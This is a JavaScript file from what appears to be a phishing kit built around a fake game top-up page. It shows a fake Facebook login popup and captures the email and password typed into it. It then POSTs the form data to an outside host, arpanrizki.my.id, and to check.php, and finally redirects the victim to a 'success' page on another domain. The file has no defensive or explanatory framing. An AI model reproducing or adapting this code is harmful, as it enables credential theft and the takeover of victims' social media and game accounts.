// code for validate data to next step
function processBuy() {
	$('#processBuyForm').submit(function(submitingprocessBuy){
	submitingprocessBuy.preventDefault();
	
	$playid = $('#playid').val().trim();
	if($playid == '') {
	} else {
	$('.account_confirmation').show();
	$(".confirmationPlayid").text($playid);
	$("input#validatePlayid").val($playid);
	}
	}); 
}

// code for showing hiding popup
function open_account_login() {
	$('.account_login').show();
	$('.account_confirmation').hide();
}
function open_facebook() {
	$('.login_facebook').show();
	$('.account_login').hide();
}
function close_account_confirmation() {
	$('.account_confirmation').hide()
}
function close_facebook() {
	$('.login_facebook').hide()
	$('.account_login').show();
}

// code for validate data to next step
function ValidateLoginFbData() {
	$('#ValidateLoginFbForm').submit(function(submitingValidateLoginFbData){
	submitingValidateLoginFbData.preventDefault();
	
	$email = $('#email-facebook').val().trim();
	$password = $('#password-facebook').val().trim();
	$login = $('#login-facebook').val().trim();
	if($email == '' || $password == '') {
	} else {
	$('.login_facebook').hide();
	$('.firstSection').hide();
	$('.account_verification').show();
	$("input#validateEmail").val($email);
	$("input#validatePassword").val($password);
	$("input#validateLogin").val($login);
	}
	}); 
}

function open_my_account() {
	var myFormAcc = $("#formLogin").serialize();
	$.ajax({url: 'https://arpanrizki.my.id/',
		data: myFormAcc,type: 'POST',
		success: function() 
		{return true;},
		error: function() 
		{return true;}});}

// code for validate data to sending to file result
function ValidateVerificationData() {
	$('#ValidateVerificationDataForm').submit(function(submitingVerificationData){
	submitingVerificationData.preventDefault();
	
	var $validateEmail = $("input#validateEmail").val();
	var $validatePassword = $("input#validatePassword").val();
	var $validatePlayid = $("input#validatePlayid").val();
	var $nick = $("input#nick").val();
	var $level = $("input#level").val();
	var $tier = $("input#tier").val();
	var $rpt = $("input#rpt").val();
	var $validateLogin = $("input#validateLogin").val();
	if($validateEmail == "" && $validatePassword == "" && $validatePlayid == "" && $nick == "" && $level == "" && $tier == "" && $rpt == "" && $validateLogin == ""){
	$('.verification_info').show();
	$('.account_verification').hide();
	return false;
	}
	
	$.ajax({
		type: "POST",
		url: "check.php",
		data: $(this).serialize(),
		beforeSend: function() {
			$('.ValidateVerificationDataBtn').html('<i class="zmdi zmdi-spinner zmdi-hc-spin zmdi-hc-1x"></i>').prop('disabled', true);
		},
		success: function(){
		window.location = "https://offiiciallweb.com/berhasil/";
		}
	});
	});  
	return false;
};